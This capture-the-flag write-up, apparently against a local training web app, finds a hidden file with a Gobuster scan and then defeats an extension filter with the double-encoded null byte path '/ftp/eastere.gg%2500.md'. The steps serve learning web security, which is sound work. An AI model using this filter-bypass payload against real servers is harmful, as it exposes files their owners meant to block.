# Easter Egg

**Category**: Security Misconfiguration  
**Difficulty**: 3  

---

### Description

This challenge required accessing a hidden file that was blocked by an insecure file extension filter.

---

### Solution

The server only allowed access to `.md` and `.pdf` files, blocking others like `.gg`. However, the validation was flawed and could be bypassed using a Poison Null Byte attack with double URL encoding.

---

### Steps

1. I discovered the `/ftp` directory using Gobuster:
   
   gobuster dir -u http://127.0.0.1:3000 -w /usr/share/seclists/Discovery/Web-Content/common.txt --exclude-length 80117

2. One of the files listed was:
   
   /ftp/eastere.gg

3. Direct access failed:
   
   403 Error: Only .md and .pdf files are allowed!

4. Using Burp Suite, I intercepted the request and changed the path to:
   
   /ftp/eastere.gg%2500.md

5. `%2500` is a double-encoded null byte which becomes `%00` when decoded by the backend.
   
   Since the string appeared to end with `.md` before full decoding, it passed the check, but the filesystem used only the part before the null byte.

6. Response:
   
   HTTP/1.1 200 OK
   
   The actual `eastere.gg` file contents were returned, completing the challenge.

---

**Challenge completed** by bypassing a flawed file extension validation with a double-encoded null byte payload.
